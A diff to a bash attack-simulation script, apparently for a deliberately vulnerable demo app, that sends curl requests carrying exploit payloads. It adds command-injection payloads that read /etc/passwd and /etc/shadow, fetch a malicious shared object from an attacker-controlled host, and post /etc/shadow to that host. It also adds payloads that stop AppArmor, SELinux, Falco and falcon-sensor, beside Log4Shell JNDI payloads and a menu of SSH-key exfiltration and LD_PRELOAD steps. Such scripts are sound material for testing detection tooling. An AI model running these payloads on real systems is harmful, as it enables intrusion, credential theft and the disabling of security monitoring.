@@ -8,6 +8,13 @@ else
   # Argument provided, set host to the first argument
   host="$1"
 fi
+if [ -z "$2" ]; then
+  # No argument provided, set host to "log4shell-service"
+  jndiserver="log4shell-service"
+else
+  # Argument provided, set host to the first argument
+  host="$2"
+fi
 
 
 
@@ -54,7 +61,7 @@ performSQLInjection() {
 performLog4ShellReverseShell() {
   curl --location 'http://'"$host"':8081/registerEmail' \
   --header 'Content-Type: application/json' \
-  --data-raw '{"firstName":"${jndi:ldap://log4shell-service:1389/jdk8}","lastName":"test a","address":"test","city":"test","telephone":"123","email":"test@test.com"}'
+  --data-raw '{"firstName":"${jndi:ldap://'"$jndiserver"':1389/jdk8}","lastName":"test a","address":"test","city":"test","telephone":"123","email":"test@test.com"}'
 }
 
 
@@ -102,7 +109,7 @@ performTrojanInjection() {
     -H 'sec-ch-ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"' \
     -H 'sec-ch-ua-mobile: ?0' \
     -H 'sec-ch-ua-platform: "macOS"' \
-    --data-raw 'firstName=$%7Bjndi:ldap://log4shell-service:1389/jdk8adr%7D&lastName=test&address=test&city=test&telephone=123'
+    --data-raw 'firstName=$%7Bjndi:ldap://'"$jndiserver"':1389/jdk8adr%7D&lastName=test&address=test&city=test&telephone=123'
 }
 
 performEtcPasswordRead() {
@@ -193,8 +200,27 @@ performPortScan() {
   curl -v 'http://'"$host"':8081/faq.html'
 }
 
-performCommandInjection() {
-    curl 'http://'"$host"':8081/cmd?arg=cat%20%2Fetc%2Fpasswd%0A'
+performCommandInjectionCatEtcPasswd() {
+  curl 'http://'"$host"':8081/cmd?arg=cat%20%2Fetc%2Fpasswd%0A'
+}
+
+performCommandInjectionCatEtcShadow() {
+  curl 'http://'"$host"':8081/cmd?arg=cat%20%2Fetc%2Fshadow%0A'
+}
+
+performCommandInjectionDownloadSharedObject() {
+  curl 'http://'"$host"':8081/cmd?arg=curl%20-o%20/tmp/pe%20http://'"$jndiserver"':8180/pe.so%0A'
+}
+
+performCommandInjectionUploadShadowFile() {
+  curl 'http://'"$host"':8081/cmd?arg=curl%20-X%20POST%20-F%20%22file=@/etc/shadow%22%20http://'"$jndiserver"':8180/upload%0A'
+}
+
+performCommandInjectionShutDownSecurityTooling() {
+  curl 'http://'"$host"':8081/cmd?arg=service%20apparmor%20stop%0A'
+  curl 'http://'"$host"':8081/cmd?arg=echo%200%20%3E%20/selinux/enforce'
+  curl 'http://'"$host"':8081/cmd?arg=systemctl%20stop%20falco'
+  curl 'http://'"$host"':8081/cmd?arg=systemctl%20stop%20falcon-sensor'
 }
 
 performDeserializationAttack() {
@@ -208,27 +234,32 @@ display_menu() {
   echo "---------------------"
   echo "     Main Menu      "
   echo " host: $host"
+  echo " jndi server: $jndiserver"
   echo "---------------------"
   echo "1. SQL Injection"
   echo "2. Path Traversal Upload"
   echo "3. Path Traversal Download"
-  echo "4 Command Injection"
-  echo "5 Perform Deserialization Attack"
-  echo "6. Log4Shell Reverse Shell"
-  echo "7. Log4Shell In App Trojan"
-  echo "8. Read /etc/passwd using Trojan"
-  echo "9. Read System Properties using Trojan"
-  echo "10. list .ssh dir"
-  echo "11. Exfiltrate SSH Private Key"
-  echo "12 Exfiltrate authorized keys"
-  echo "13 Modify authorized keys"
-  echo "14 Exfiltrate app.jar"
-  echo "15 Exfiltrate heapdump"
-  echo "16 Modify .bashrc File"
-  echo "17 Download Malicious Shared Object"
-  echo "18 Write Payload to Preload"
-  echo "19 Port Scan"
-  echo "20 Run all commands in turn"
+  echo "4 Command Injection cat /etc/passwd"
+  echo "5 Command Injection cat /etc/shadow"
+  echo "6 Command Injection download shared object"
+  echo "7 Command Injection upload shadow file"
+  echo "8 Command Injection shut down security tooling"
+  echo "9 Perform Deserialization Attack"
+  echo "10. Log4Shell Reverse Shell"
+  echo "11. Log4Shell In App Trojan"
+  echo "12. Read /etc/passwd using Trojan"
+  echo "13. Read System Properties using Trojan"
+  echo "14. list .ssh dir"
+  echo "15. Exfiltrate SSH Private Key"
+  echo "16 Exfiltrate authorized keys"
+  echo "17 Modify authorized keys"
+  echo "18 Exfiltrate app.jar"
+  echo "19 Exfiltrate heapdump"
+  echo "20 Modify .bashrc File"
+  echo "21 Download Malicious Shared Object"
+  echo "22 Write Payload to Preload"
+  echo "23 Port Scan"
+  echo "24 Run all commands in turn"
   echo "---------------------"
 }
 
@@ -259,91 +290,115 @@ while true; do
       read -p "Press Enter to continue..."
     ;;
     4)
-      echo "Command Injection"
-      performCommandInjection
+      echo "Command Injection cat /etc/passwd"
+      performCommandInjectionCatEtcPasswd
       read -p "Press Enter to continue..."
       ;;
     5)
+      echo "Command Injection cat /etc/shadow"
+      performCommandInjectionCatEtcShadow
+      read -p "Press Enter to continue..."
+      ;;
+    6)
+      echo "Command Injection download shared object"
+      performCommandInjectionDownloadSharedObject
+      read -p "Press Enter to continue..."
+      ;;
+    7)
+      echo "Command Injection upload shadow file"
+      performCommandInjectionUploadShadowFile
+      read -p "Press Enter to continue..."
+      ;;
+    8)
+      echo "Command Injection shut down security tooling"
+      performCommandInjectionShutDownSecurityTooling
+      read -p "Press Enter to continue..."
+      ;;
+    9)
       echo "Perform Deserialization"
       performDeserializationAttack
       read -p "Press Enter to continue..."
     ;;
-    6)
+    10)
       echo "Log4Shell Reverse Shell"
       performLog4ShellReverseShell
       read -p "Press Enter to continue..."
     ;;
-    7)
+    11)
       echo "Log4Shell In Application Trojan"
       performTrojanInjection
       read -p "Press Enter to continue..."
     ;;
-    8)
+    12)
       echo "Read /etc/passwd using Trojan"
       performEtcPasswordRead
       read -p "Press Enter to continue..."
       ;;
-    9)
+    13)
       echo "Read System Properties using Trojan"
       performSystemPropertiesRead
       read -p "Press Enter to continue..."
       ;;
-    10)
+    14)
       echo "List .ssh directory"
       performListingOfSSHDir
       read -p "Press Enter to continue..."
       ;;
-    11)
+    15)
       echo "Exfiltrate SSH Private Key"
       performReadOfSSHPrivateKey
       read -p "Press Enter to continue..."
       ;;
-    12)
+    16)
       echo "Exfiltrate authorized_keys file"
       performExfiltrateAuthorizedKeys
       read -p "Press Enter to continue..."
       ;;
-    13)
+    17)
       echo "Modify authorized keys"
       performModifyAuthorizedKeys
       read -p "Press Enter to continue..."
       ;;
-    14)
+    18)
       echo "Exfiltrate App jar"
       performExfiltrateAppJar
       read -p "Press Enter to continue..."
       ;;
-    15)
+    19)
       echo "Exfiltrate Heap Dump File"
       performExfiltrateHeapDump
       read -p "Press Enter to continue..."
       ;;
-    16)
+    20)
       echo "Modify .bashrc file"
       performModifyBashRCFile
       read -p "Press Enter to continue..."
       ;;
-    17)
+    21)
       echo "Download Malicious pe.so file"
       performDownloadOfMaliciousSharedObject
       read -p "Press Enter to continue..."
       ;;
-    18)
+    22)
       echo "Inject the Malicious pe.so shared file"
       performWritePayloadToPreload
       read -p "Press Enter to continue..."
       ;;
-    19)
+    23)
       echo "Perform Port Scan"
       performPortScan
       read -p "Press Enter to continue..."
       ;;
-    20)
+    24)
       echo "running all commands, this will take a while"
       performSQLInjection
       performPathTraversalUpload
       performPathTraversalDownload
-      performCommandInjection
+      performCommandInjectionCatEtcPasswd
+      performCommandInjectionCatEtcShadow
+      performCommandInjectionDownloadSharedObject
+      performCommandInjectionUploadShadowFile
+      performCommandInjectionShutDownSecurityTooling
       performDeserializationAttack
       performLog4ShellReverseShell
       performTrojanInjection
